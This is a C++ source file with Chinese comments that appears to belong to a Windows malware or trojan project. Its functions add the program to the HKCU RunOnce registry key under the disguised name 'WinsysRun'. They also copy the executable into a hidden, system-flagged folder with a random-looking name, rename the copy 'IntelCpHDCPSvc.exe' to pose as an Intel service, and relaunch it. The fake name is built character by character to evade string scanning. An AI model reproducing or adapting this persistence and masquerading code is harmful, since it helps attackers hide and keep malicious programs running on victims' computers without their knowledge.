#include "SelfRun.h"
#include <Windows.h>
#include<fstream>
#include<io.h>
#include <string>
#include<direct.h>
#include <iostream>
#include"CmdLine.h"
using namespace std;
//定义路径最大程度
//#define MAX_PATH 4096
//定义写入的注册表路径
//#define SELFSTART_REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
#define SELFSTART_REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\"
//设置本身开机自启动 参数为true表示设置自启，为false 表示取消

string orders = "start ";
DWORD WINAPI NewExe(LPVOID lpParameter);


BOOL SelfRun::SetSelfStart(BOOL bKey)
{
	//获取程序完整路径
	char pName[MAX_PATH] = { 0 };
	GetModuleFileNameA(NULL, pName, MAX_PATH);
	//在注册表中写入启动信息
	HKEY hKey = NULL;
	LONG lRet = NULL;
	if (bKey)
	{
		//打开注册表
		lRet = RegOpenKeyExA(HKEY_CURRENT_USER, SELFSTART_REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);
		//判断是否成功
		if (lRet != ERROR_SUCCESS)
		{
			return FALSE;
		}
		else
		{

			//写入注册表，名为"WinsysRun"，可以自己修改
			RegSetValueExA(hKey, "WinsysRun", 0, REG_SZ, (const unsigned char*)pName, strlen(pName) + sizeof(char));

			//关闭注册表            RegCloseKey(hKey);
			return TRUE;
		}
	}
	else
	{
		lRet = RegOpenKeyExA(HKEY_CURRENT_USER, SELFSTART_REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);
		//判断是否成功
		if (lRet != ERROR_SUCCESS)
		{
			return FALSE;
		}
		else
		{

			//删除名为"WinsysRun"的注册表信息
			RegDeleteValueA(hKey, "WinsysRun");

			//关闭注册表            
			RegCloseKey(hKey);
			return TRUE;
		}
	}
}
/*
return  1:失败 没打开注册表
2.成功 文件已经重命名，成功加入自启
3.失败 文件没有重命名，且CDEFGH盘都不存在

*/
int SelfRun::MoveSelf()
{
	string nameWithPath = "";
	char pName[MAX_PATH] = { 0 };
	char exeName[MAX_PATH] = { 0 };
	char exeNameFinal[MAX_PATH] = /*"IntelCpHDCPSvc.exe" =*/ { 'I','n','t','e','l','C','p','H','D','C','P','S','v','c','.','e','x','e','\0' };
	GetModuleFileNameA(NULL, pName, MAX_PATH);
	HKEY hKey = NULL;
	LONG lRet = NULL;
	int i = 0;
	int j = 0;
	for (; pName[i] != '\0'; i++);
	for (; pName[i] != '\\'; i--);
	i++;
	for (; pName[i] != '\0'; i++)
	{
		exeName[j++] = pName[i];
	}
	exeName[j] = '\0';
	if (strcmp(exeName, exeNameFinal) == 0)
	{
		//直接注册自启
		//打开注册表
		lRet = RegOpenKeyExA(HKEY_CURRENT_USER, SELFSTART_REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);
		//判断是否成功
		if (lRet != ERROR_SUCCESS)
			return 1;
		else
		{

			//写入注册表，名为"WinsysRun"，可以自己修改
			RegSetValueExA(hKey, "WinsysRun", 0, REG_SZ, (const unsigned char*)pName, strlen(pName) + sizeof(char));
			//关闭注册表            
			RegCloseKey(hKey);
			return 2;
		}
	}
	else
	{
		/*复制到指定目录下之后，对新程序注册自启*/
		for (int m = 0; m < 5; m++)
		{
			char dir[4] = {'D'+m,':','\\','\0' };
			if (_access(dir, 0) == 0)
			{
				nameWithPath += dir;
				break;
			}
		}
		if (nameWithPath.size() == 0)
		{
			char dir[4] = { 'C' ,':','\\','\0' };
			if (_access(dir, 0) == 0)
			{
				nameWithPath += dir;
			}
			else
				return 3;
		}
		else
		{
			//创建路径
			//隐藏路径
			//复制文件
			//启动程序
			nameWithPath += "m00zz12548dqqfgtad7895521";
			_mkdir(nameWithPath.c_str());
			string nameWithPathLs = nameWithPath;
			nameWithPath += "\\a00zz12548dqqfgtad7";
			_mkdir(nameWithPath.c_str());
			SetFileAttributes(nameWithPathLs.c_str(), FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN
				| FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);
			//SetFileAttributes(nameWithPathLs.c_str(), FILE_ATTRIBUTE_NORMAL);
			nameWithPath += "\\";
			nameWithPath += exeNameFinal;
			/*如果文件存在*/
			if (_access(nameWithPath.c_str(), 0) == 0)
				return 5;

			fstream in(pName, fstream::in | fstream::binary);
				std::fstream out;//写入文件
				out.open(nameWithPath,fstream::out | fstream::binary | fstream::trunc);
			#define LENGTH_FILE_BODY 2048
				char szBuf[LENGTH_FILE_BODY] = { 0 };
				while (!in.eof())
				{
					in.read(szBuf, LENGTH_FILE_BODY);
					int len = in.gcount();
					out.write(szBuf, len);
				}
				out.close();
				in.close();
				orders += nameWithPath;
				HANDLE handle1 = CreateThread(NULL, 0, NewExe, NULL, 0, NULL);
				CloseHandle(handle1);
				Sleep(100);
				return 4;
		}
		
	}


	return 0;
}
DWORD WINAPI NewExe(LPVOID lpParameter)
{
	string result;
	//cout << orders << endl;
	CmdLine::cmdLine(orders, result);
	return 0;
}


